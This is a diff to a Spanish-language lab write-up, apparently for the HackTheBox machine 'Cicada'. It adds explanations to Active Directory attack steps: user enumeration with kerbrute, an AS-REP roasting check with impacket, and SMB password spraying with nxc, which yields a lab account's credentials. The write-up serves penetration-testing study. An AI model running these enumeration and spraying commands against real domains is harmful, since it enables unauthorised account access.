@@ -165,20 +165,26 @@ kerbrute userenum  --dc 10.129.231.149 -d cicada.htb users
 ```
 
 Nos devuelve que los usuarios son validos probaremos con este listado potencial de usuarios ver si son susceptibles al ataque  [[#AS-REP Roasting Attack]]
-## AS-REP Roasting Attack
 
+# Explotación
+## AS-REP Roasting Attack
 Para ver si son susceptibles los usuarios a este ataque usaremos la herramienta `IMPACKET` con los parámetros
-- `-no-pa`
+- `-no-pass` para no usar contraseña
+- `-usersfile` para pasar una lista de usuarios
 `impacket-GetNPUsers -no-pass -usersfile users.txt cicada.htb/`
 
-Vemos que no son susceptibles
+Después de ejecutarlo vemos que los usuarios no son susceptibles
 
 ## Password spraying
+Con la contraseña que hemos obtenido del `.txt` en [[#Enumeración SMB (139, 445)]] y los usuarios con [[#Enumeración de usuarios]] usando la herramienta [[CRACKMAPEXEC]] con la opcion
+- `smb` para usar el servicio SMB para hacer el ataque
+- `-u` para pasarle una lista de usuarios
+- `-p` para pasarle una lista de contraseñas
+```shell
+nxc smb 10.129.231.149 -u users.txt -p passwords
+```
 
-Con la contraseña que hemos obtenido del `.txt` en [[#SMB (139, 445)]] y los usuarios con [[#Enumeración de usuarios validos]]
-`nxc smb 10.129.231.149 -u users.txt -p passwords`
-
-Optemos las siguientes credenciales
+Despues de la ejecucion optemos las siguientes credenciales
 ```ad-hint
 michael.wrightson::Cicada$M6Corpb*@Lp#nZp!8
 ```
